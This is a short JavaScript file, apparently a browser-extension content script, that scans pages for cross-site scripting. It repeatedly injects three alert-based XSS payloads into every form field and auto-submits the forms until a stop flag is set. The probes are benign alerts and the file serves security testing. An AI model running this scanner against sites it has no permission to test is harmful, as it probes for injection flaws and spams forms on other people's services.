// Initialize scanning flag
if (typeof window.windowStopScanning === "undefined") {
    window.windowStopScanning = false; // Default to scanning not stopped
}

function injectPayloads() {
    if (window.windowStopScanning) return; // Stop the loop if scanning is stopped

    const payloads = [
        "<script>alert('XSS')</script>",
        "' onerror='alert(1)'",
        "<img src=x onerror=alert(1)>"
    ];

    // Iterate through input fields and inject payloads
    document.querySelectorAll('input, textarea').forEach(field => {
        payloads.forEach(payload => {
            if (window.windowStopScanning) return; // Stop if scanning is stopped
            field.value = payload;
            const form = field.closest('form');
            if (form) form.submit();
        });
    });

    // Repeat the injection every 3 seconds if scanning is not stopped
    if (!window.windowStopScanning) {
        setTimeout(injectPayloads, 3000);
    }
}

// Start the scanning process
function startScanning() {
    if (!window.windowStopScanning) {
        injectPayloads(); // Start payload injection
    }
}

// Stop the scanning process
function stopScanning() {
    window.windowStopScanning = true; // Set flag to stop scanning
}

// Expose start and stop functions globally so they can be called by the background script
window.startScanning = startScanning;
window.stopScanning = stopScanning;
